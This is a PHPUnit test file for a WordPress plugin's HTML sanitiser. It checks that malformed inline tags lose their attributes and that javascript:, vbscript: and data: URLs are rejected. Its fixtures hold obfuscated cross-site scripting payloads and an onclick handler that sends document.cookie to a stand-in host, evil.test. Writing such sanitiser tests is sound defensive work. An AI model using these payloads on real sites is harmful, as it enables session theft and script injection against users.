<?php
/**
 * The HTML helper every builder reader shares: an "html" field keeps only the
 * inline tags it rebuilds itself, without attributes, however broken the
 * markup a page holds; an address that could run code never passes, however
 * it is spelled.
 *
 * @package AlphaBridge_MCP
 */

declare( strict_types = 1 );

namespace AlphaBridge\Tests;

use AB_MCP_Builder_Html;
use AB_MCP_Tools_Builders;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

final class BuilderHtmlTest extends TestCase {

	use BuilderTestHelpers;

	protected function setUp(): void {
		ab_test_reset();
		ab_test_add_user( 7 );
		$GLOBALS['ab_test_current_user'] = 7;
		$this->mayDoAnything();
	}

	/**
	 * Start tags the tag pattern does not take, because an attribute part is
	 * malformed: before the fix strip_tags() kept them whole, attributes and
	 * all, since their tag name was on the list of allowed inline tags.
	 *
	 * @return array<string,array{0:string,1:string}>
	 */
	public static function malformedTags(): array {
		return array(
			'quoted name'     => array( '<p>Hallo <a href="https://x.test" onclick="alert(1)" "y">Link</a> Welt</p>', 'Hallo Link Welt' ),
			'bare equals'     => array( '<p><b style="color:red" =x>fett</b></p>', 'fett' ),
			'unquoted, junk'  => array( '<p><strong onmouseover=alert(1) "z">x</strong></p>', 'x' ),
			'tab, junk'       => array( "<p><em\tclass=\"c\"\tonclick=\"x()\" 'q'>kursiv</em></p>", 'kursiv' ),
			// strip_tags() reads the lone quote as opening a value and drops the
			// rest: text lost, never markup let through.
			'stray quote'     => array( '<p><i class="a" style="background:url(javascript:alert(1))" \'>t</i> nach</p>', '' ),
			'mark in content' => array( "<p>a\x1A0\x1A<b onclick=\"x\" \"y\">b</b></p>", 'a0b' ),
		);
	}

	#[DataProvider( 'malformedTags' )]
	public function testMalformedTagsLoseEveryAttribute( string $html, string $text ): void {
		$out = AB_MCP_Builder_Html::simple( $html );
		self::assertSame( $text, strip_tags( $out ), 'The visible text stays.' );
		foreach ( array( 'onclick', 'onmouseover', 'style', 'class', 'alert', '"y"', '=x', "\x1A" ) as $never ) {
			self::assertStringNotContainsString( $never, $out, $never );
		}
		self::assertDoesNotMatchRegularExpression( '~<[a-z]+\s~i', $out, 'No start tag carries anything but its name.' );
	}

	public function testWellFormedInlineTagsStayWithoutAttributes(): void {
		self::assertSame(
			'Ab <strong>CHF 30</strong>, <a href="https://example.com/a">mehr</a> <em>hier</em><br>weiter',
			AB_MCP_Builder_Html::simple( '<p class="x">Ab <strong class="s">CHF 30</strong>, <a href="https://example.com/a" target="_blank" onclick="y()">mehr</a> <em style="c">hier</em><br class="b">weiter</p>' )
		);
		self::assertSame( '<a>ok</a>', AB_MCP_Builder_Html::simple( '<a href="javascript:alert(1)" onclick="x">ok</a>' ) );
		self::assertSame( 'zu', AB_MCP_Builder_Html::simple( 'zu</b></strong>' ), 'A closing tag nothing opened is dropped.' );
		self::assertSame( 'a < b', AB_MCP_Builder_Html::simple( 'a < b' ), 'A "<" that opens no tag is text.' );
	}

	public function testThroughTheToolOnABlockPage(): void {
		$content = "<!-- wp:paragraph -->\n<p>Hallo <a href=\"https://x.test\" onclick=\"fetch('https://evil.test/?c='+document.cookie)\" \"y\">Link</a> x<b style=\"color:red\" =x>fett</b></p>\n<!-- /wp:paragraph -->";
		$this->page( 501, $content );
		$out  = AB_MCP_Tools_Builders::get_builder_layout( array( 'id' => 501 ) );
		$flat = $this->flat( $out['elements'] );
		self::assertSame( 'Hallo Link xfett', $out['elements'][0]['fields']['text']['value'] );
		foreach ( array( 'onclick', 'evil.test', 'cookie', 'style', 'color:red' ) as $never ) {
			self::assertStringNotContainsString( $never, $flat, $never );
		}
	}

	/**
	 * Addresses that run code, hidden by case, white space, control
	 * characters or entities.
	 *
	 * @return array<string,array{0:string}>
	 */
	public static function codeAddresses(): array {
		return array(
			'plain'          => array( 'javascript:alert(1)' ),
			'case'           => array( 'JaVaScRiPt:alert(1)' ),
			'tab inside'     => array( "java\tscript:alert(1)" ),
			'newline inside' => array( "java\nscript:alert(1)" ),
			'control first'  => array( "\x01javascript:alert(1)" ),
			'space first'    => array( '  javascript:alert(1)' ),
			'entity tab'     => array( 'java&#x09;script:alert(1)' ),
			'vbscript'       => array( "vb\x0bscript:msgbox(1)" ),
			'data'           => array( "da\rta:text/html,<script>alert(1)</script>" ),
			'svg image data' => array( 'data:image/svg+xml,<svg onload=alert(1)>' ),
		);
	}

	#[DataProvider( 'codeAddresses' )]
	public function testAddressesThatRunCodeNeverPass( string $url ): void {
		self::assertNull( AB_MCP_Builder_Html::safe_url( $url ) );
		self::assertNull( AB_MCP_Builder_Html::safe_url( $url, true ), 'Not as an image source either.' );
		self::assertSame( '<a>x</a>', AB_MCP_Builder_Html::simple( '<a href="' . htmlspecialchars( $url, ENT_QUOTES ) . '">x</a>' ) );
	}

	public function testOrdinaryAddressesPass(): void {
		foreach ( array( 'https://example.com/a?b=1', '/kontakt', '#oben', '?p=2', 'mailto:info@example.com', 'tel:+41311234567', 'page,42' ) as $url ) {
			self::assertSame( $url, AB_MCP_Builder_Html::safe_url( $url ), $url );
		}
		self::assertSame( 'data:image/png;base64,iVBORw0KGgo=', AB_MCP_Builder_Html::safe_url( 'data:image/png;base64,iVBORw0KGgo=', true ) );
	}
}
